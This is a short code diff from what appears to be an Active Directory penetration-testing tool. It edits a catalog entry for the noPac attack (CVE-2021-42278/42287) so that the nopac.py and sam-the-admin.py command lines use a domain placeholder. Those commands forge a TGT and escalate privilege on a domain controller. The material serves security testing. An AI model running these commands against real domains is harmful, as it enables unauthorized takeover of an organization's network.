@@ -24,8 +24,8 @@ CVE_TECHNIQUES: dict[str, CveTechnique] = {
         cve_ids=("CVE-2021-42278", "CVE-2021-42287"),
         summary="Forge TGT via DC sAMAccountName mismatch (requires MAQ > 0).",
         manual_commands=(
-            "nopac.py corp.local/user:pass -dc-ip <DC> -dc-host <DCNAME>",
-            "sam-the-admin.py corp.local/user:pass -dc-ip <DC>",
+            "nopac.py <DOMAIN>/user:pass -dc-ip <DC> -dc-host <DCNAME>",
+            "sam-the-admin.py <DOMAIN>/user:pass -dc-ip <DC>",
         ),
     ),
     "zerologon": CveTechnique(
